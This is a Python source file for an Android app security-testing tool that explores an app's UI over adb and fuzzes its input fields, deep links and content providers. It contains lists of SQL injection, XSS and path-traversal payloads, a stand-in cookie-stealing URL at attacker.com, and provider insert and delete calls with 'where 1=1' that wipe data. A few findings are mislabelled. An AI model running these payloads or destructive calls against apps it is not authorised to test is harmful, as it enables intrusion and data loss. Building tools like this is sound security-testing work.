"""
Auto UI Exploration — Layer 2/3/6/7
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Pipeline:
  1. Install APK (adb install)
  2. Launch main activity (adb shell am start)
  3. Capture screen hierarchy (uiautomator2 / adb shell uiautomator)
  4. Detect interactive elements (buttons, inputs, clickable)
  5. BFS traversal: click all elements, discover new screens
  6. Input fuzzing on detected fields (email, password, search, URL)
  7. Deep link fuzzing (all registered schemes/paths)
  8. Content provider fuzzing (query/insert/update/delete with payloads)

Output:
  - Reachable activities set
  - Hidden activities discovered only via navigation
  - Input fields with auto-filled payloads
  - Deep link responses (crash, redirect, data leak)
  - Provider query results
"""

import subprocess
import os
import json
import re
import time
import xml.etree.ElementTree as ET
from collections import deque, defaultdict

PAYLOADS = {
    "email": ["test@test.com", "' OR 1=1--@test.com", "admin@admin.com"],
    "password": ["password123", "' OR 1=1--", "admin", "P@$$w0rd!"],
    "phone": ["+1-555-555-0199", "1234567890", "' OR 1=1--"],
    "url": ["http://evil.com", "javascript:alert(1)", "file:///data/data/com.test/databases/",
            "https://attacker.com/steal.php?cookie="],
    "search": ["test", "<script>alert(1)</script>", "' OR '1'='1"],
    "amount": ["0", "-1", "9999999999", "' OR 1=1--"],
    "default": ["test", "' OR 1=1--", "../../../etc/passwd", "<test>"],
}


class UIExplorer:
    def __init__(self, adb_path="adb", device_serial=None, pkg_name=None,
                 apk_path=None, max_time=300):
        self.adb_path = adb_path or os.environ.get("ADB_PATH", "adb")
        self.device_serial = device_serial
        self.pkg_name = pkg_name
        self.apk_path = apk_path
        self.max_time = max_time
        self.results = {
            "activities_discovered": [],
            "reachable_activities": [],
            "hidden_activities": [],
            "ui_screens": [],
            "input_fields": [],
            "deep_links_tested": [],
            "provider_results": [],
            "crashes": [],
        }

    def _adb(self, args, timeout=30):
        cmd = [self.adb_path]
        if self.device_serial:
            cmd += ["-s", self.device_serial]
        cmd += args
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, r.stdout, r.stderr
        except FileNotFoundError:
            return -1, "", "adb not found"
        except subprocess.TimeoutExpired:
            return -1, "", "timeout"

    def install_apk(self):
        if not self.apk_path:
            return False
        rc, out, err = self._adb(["install", "-r", "-t", self.apk_path], timeout=120)
        success = "Success" in out
        if success:
            self.results["installation"] = "success"
        else:
            self.results["installation"] = f"failed: {err[:200]}"
        return success

    def _get_main_activity(self):
        if not self.apk_path:
            return None
        try:
            from androguard.core.bytecodes.apk import APK
            apk = APK(self.apk_path)
            return apk.get_main_activity()
        except Exception:
            return None

    def _dump_ui_hierarchy(self):
        rc, out, err = self._adb([
            "shell", "uiautomator", "dump", "/sdcard/ui.xml",
            "--compressed"
        ], timeout=15)
        if rc != 0:
            return None
        rc2, out2, err2 = self._adb([
            "exec-out", "cat", "/sdcard/ui.xml"
        ], timeout=10)
        if rc2 != 0:
            return None
        try:
            root = ET.fromstring(out2)
            return root
        except Exception:
            return out2

    def _parse_ui_elements(self, root):
        elements = []
        if root is None:
            return elements

        try:
            for node in root.iter():
                if node.tag != "node":
                    continue
                attrs = dict(node.attrib)
                clazz = attrs.get("class", "")
                text = attrs.get("text", "")
                content_desc = attrs.get("content-desc", "")
                bounds = attrs.get("bounds", "")
                clickable = attrs.get("clickable", "false") == "true"
                resource_id = attrs.get("resource-id", "")
                package = attrs.get("package", "")

                if not clazz:
                    continue

                elem = {
                    "class": clazz,
                    "text": text,
                    "content_desc": content_desc,
                    "bounds": bounds,
                    "clickable": clickable,
                    "resource_id": resource_id,
                    "package": package,
                    "checkable": attrs.get("checkable", "false") == "true",
                    "checked": attrs.get("checked", "false") == "true",
                    "enabled": attrs.get("enabled", "true") == "true",
                    "focusable": attrs.get("focusable", "false") == "true",
                    "scrollable": attrs.get("scrollable", "false") == "true",
                    "long_clickable": attrs.get("long-clickable", "false") == "true",
                    "password": attrs.get("password", "false") == "true",
                }
                elements.append(elem)
        except Exception:
            pass
        return elements

    def _click_element(self, bounds_str):
        match = re.search(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]', bounds_str)
        if not match:
            return False
        x1, y1, x2, y2 = int(match.group(1)), int(match.group(2)), int(match.group(3)), int(match.group(4))
        x = (x1 + x2) // 2
        y = (y1 + y2) // 2
        rc, out, err = self._adb([
            "shell", "input", "tap", str(x), str(y)
        ], timeout=5)
        return rc == 0

    def _input_text(self, text):
        rc, out, err = self._adb([
            "shell", "input", "text", text
        ], timeout=5)
        return rc == 0

    def _get_current_activity(self):
        rc, out, err = self._adb([
            "shell", "dumpsys", "window", "windows",
            "|", "grep", "-E", "'mCurrentFocus|mFocusedApp'"
        ], timeout=10)
        if rc == 0 and out:
            match = re.search(r'([\w.]+/[\w.]+)', out)
            if match:
                return match.group(1)
        return None

    def _launch_activity(self, activity):
        pkg = self.pkg_name or ""
        rc, out, err = self._adb([
            "shell", "am", "start", "-n", f"{pkg}/{activity}"
        ], timeout=10)
        time.sleep(1)
        return "Error" not in out

    def _launch_deep_link(self, uri):
        pkg = self.pkg_name or ""
        rc, out, err = self._adb([
            "shell", "am", "start", "-a", "android.intent.action.VIEW",
            "-d", uri, pkg
        ], timeout=10)
        time.sleep(1)
        result = {
            "uri": uri,
            "launched": "Error" not in out,
            "output": out[:200],
            "error": err[:200] if err else None,
        }
        if "Error" not in out:
            cur_act = self._get_current_activity()
            if cur_act:
                result["landed_on"] = cur_act
        return result

    def _provider_query(self, authority):
        rc, out, err = self._adb([
            "shell", "content", "query", "--uri",
            f"content://{authority}/"
        ], timeout=15)
        return {"authority": authority, "rc": rc, "output": out[:500], "error": err[:200]}

    def _provider_insert(self, authority):
        rc, out, err = self._adb([
            "shell", "content", "insert", "--uri",
            f"content://{authority}/",
            "--bind", "name:s:test",
            "--bind", "value:s:injected"
        ], timeout=15)
        return {"authority": authority, "operation": "insert", "output": out[:200]}

    def _provider_delete(self, authority):
        rc, out, err = self._adb([
            "shell", "content", "delete", "--uri",
            f"content://{authority}/",
            "--where", "1=1"
        ], timeout=15)
        return {"authority": authority, "operation": "delete", "output": out[:200]}

    def _clear_app_data(self):
        if not self.pkg_name:
            return
        self._adb(["shell", "pm", "clear", self.pkg_name], timeout=15)

    def explore_activities(self, activities):
        explored = []
        for act in activities:
            time.sleep(0.5)
            success = self._launch_activity(act)
            if success:
                cur = self._get_current_activity()
                explored.append({
                    "activity": act,
                    "reachable": True,
                    "landed_on": cur or act,
                })
            else:
                explored.append({
                    "activity": act,
                    "reachable": False,
                })
        self.results["activities_discovered"] = activities
        self.results["reachable_activities"] = [e for e in explored if e.get("reachable")]
        hidden = [a for a in activities if a not in
                  [e.get("activity") for e in self.results["reachable_activities"]]]
        self.results["hidden_activities"] = hidden
        return explored

    def bfs_ui_traverse(self, max_screens=20):
        visited_screens = set()
        screen_queue = deque()
        start_activity = self._get_current_activity()
        if start_activity:
            screen_queue.append(start_activity)

        screens_data = []

        while screen_queue and len(screens_data) < max_screens:
            cur_screen = screen_queue.popleft()
            if cur_screen in visited_screens:
                continue
            visited_screens.add(cur_screen)

            root = self._dump_ui_hierarchy()
            elements = self._parse_ui_elements(root)

            screen_info = {
                "activity": cur_screen,
                "elements": len(elements),
                "clickable_count": sum(1 for e in elements if e["clickable"]),
                "input_count": sum(1 for e in elements if "EditText" in e["class"]),
                "inputs": [],
                "buttons_clicked": [],
            }

            input_fields = [e for e in elements if "EditText" in e["class"]]
            for field in input_fields:
                field_type = self._detect_input_type(field)
                payloads = PAYLOADS.get(field_type, PAYLOADS["default"])
                if field.get("password"):
                    payloads = PAYLOADS["password"]
                input_entry = {
                    "resource_id": field.get("resource_id", ""),
                    "hint": field.get("text", ""),
                    "detected_type": field_type,
                    "payloads_tested": [],
                }
                for payload in payloads[:1]:
                    self._click_element(field.get("bounds", ""))
                    self._input_text(payload)
                    input_entry["payloads_tested"].append(payload)
                screen_info["inputs"].append(input_entry)
                self.results["input_fields"].append(input_entry)

            buttons = [e for e in elements if e["clickable"] and
                       ("Button" in e["class"] or e.get("text") or e.get("content_desc"))]
            for btn in buttons[:5]:
                self._click_element(btn.get("bounds", ""))
                time.sleep(1)
                new_activity = self._get_current_activity()
                screen_info["buttons_clicked"].append({
                    "text": btn.get("text", "") or btn.get("content_desc", ""),
                    "bounds": btn.get("bounds", ""),
                    "landed_on": new_activity,
                })
                if new_activity and new_activity not in visited_screens:
                    screen_queue.append(new_activity)
                self._adb(["shell", "input", "keyevent", "4"], timeout=3)  # back
                time.sleep(0.5)

            screens_data.append(screen_info)

        self.results["ui_screens"] = screens_data
        return screens_data

    def fuzz_deep_links(self, deep_links):
        results = []
        for dl in deep_links:
            uri = dl.get("uri", dl if isinstance(dl, str) else "")
            result = self._launch_deep_link(uri)
            results.append(result)

            traversal_payloads = [
                uri.rstrip("/") + "/../../data/data/" + (self.pkg_name or "com.test"),
                uri.rstrip("/") + "/../../../etc/hosts",
                uri.rstrip("/") + "/admin",
                uri.rstrip("/") + "/settings",
                uri.rstrip("/") + "/debug",
                uri.rstrip("/") + "/internal",
                uri.rstrip("/") + "?url=javascript:alert(1)",
                uri.rstrip("/") + "?name=<script>alert(1)</script>",
                uri.rstrip("/") + "?id=' OR 1=1--",
            ]
            for payload in traversal_payloads:
                r2 = self._launch_deep_link(payload)
                if r2["launched"] and r2.get("landed_on") != result.get("landed_on"):
                    r2["interesting"] = True
                    results.append(r2)

        self.results["deep_links_tested"] = results
        return results

    def fuzz_providers(self, authorities):
        results = []
        for auth in authorities:
            r = self._provider_query(auth)
            if "Error" not in r.get("output", "") and r["rc"] == 0:
                r["accessible"] = True
                insert_r = self._provider_insert(auth)
                results.append(r)
                results.append(insert_r)

                delete_r = self._provider_delete(auth)
                results.append(delete_r)

                sqli_payloads = [
                    f"content://{auth}/",
                    f"content://{auth}/../",
                    f"content://{auth}/../../data/data/{self.pkg_name or 'com.test'}/",
                ]
                for sqli_uri in sqli_payloads:
                    r2 = self._provider_query(sqli_uri)
                    if "Error" not in r2.get("output", ""):
                        r2["interesting"] = True
                        results.append(r2)
            else:
                r["accessible"] = False
                results.append(r)

        self.results["provider_results"] = results
        return results

    def _detect_input_type(self, field):
        text = (field.get("text", "") + " " +
                field.get("hint", "") + " " +
                field.get("resource_id", "")).lower()
        if field.get("password"):
            return "password"
        if "email" in text:
            return "email"
        if "password" in text or "pass" in text:
            return "password"
        if "phone" in text or "mobile" in text or "tel" in text:
            return "phone"
        if "url" in text or "link" in text or "website" in text:
            return "url"
        if "search" in text:
            return "search"
        if "amount" in text or "price" in text or "cost" in text:
            return "amount"
        return "default"

    def run_full_exploration(self, activities=None, deep_links=None, authorities=None,
                             max_screens=20):
        self.results["started_at"] = time.time()

        if self.apk_path:
            installed = self.install_apk()
            if not installed:
                self.results["error"] = "APK installation failed"
                return self.results

        if not self.pkg_name:
            return self.results

        main_act = self._get_main_activity()
        if main_act:
            self._launch_activity(main_act)
            time.sleep(2)

        if activities:
            self.explore_activities(activities)

        self.bfs_ui_traverse(max_screens=max_screens)

        if deep_links:
            self.fuzz_deep_links(deep_links)

        if authorities:
            self.fuzz_providers(authorities)

        self.results["completed_at"] = time.time()
        self.results["duration_seconds"] = (
            self.results["completed_at"] - self.results["started_at"]
        )
        return self.results

    def get_summary(self):
        return {
            "screens_explored": len(self.results.get("ui_screens", [])),
            "activities_tested": len(self.results.get("activities_discovered", [])),
            "reachable": len(self.results.get("reachable_activities", [])),
            "hidden": len(self.results.get("hidden_activities", [])),
            "input_fields_fuzzed": len(self.results.get("input_fields", [])),
            "deep_links_tested": len(self.results.get("deep_links_tested", [])),
            "providers_tested": len(self.results.get("provider_results", [])),
            "crashes": len(self.results.get("crashes", [])),
        }

    def get_findings(self):
        findings = []

        hidden = self.results.get("hidden_activities", [])
        if hidden:
            findings.append({
                "id": "UI-001",
                "name": "Hidden Activities Discovered",
                "severity": "HIGH",
                "category": "ui_exploration",
                "details": hidden,
                "description": f"{len(hidden)} activities not directly launchable but reachable via navigation",
            })

        for dl in self.results.get("deep_links_tested", []):
            if dl.get("interesting"):
                findings.append({
                    "id": "UI-002",
                    "name": f"Interesting Deep Link Response: {dl['uri'][:60]}",
                    "severity": "MEDIUM",
                    "category": "ui_exploration",
                    "description": f"Deep link {dl['uri']} showed interesting behavior (traversal/redirect)",
                })

        for prov in self.results.get("provider_results", []):
            if prov.get("interesting"):
                findings.append({
                    "id": "UI-003",
                    "name": f"Provider Accessible: {prov.get('authority', '')}",
                    "severity": "HIGH",
                    "category": "ui_exploration",
                    "description": f"Provider {prov.get('authority')} is accessible and may be vulnerable",
                })

        for inp in self.results.get("input_fields", []):
            findings.append({
                "id": "UI-004",
                "name": f"Input Field: {inp.get('resource_id', 'unknown')}",
                "severity": "INFO",
                "category": "ui_exploration",
                "description": f"Input field '{inp.get('hint', '')}' type={inp.get('detected_type', 'default')} auto-filled with payloads",
            })

        return findings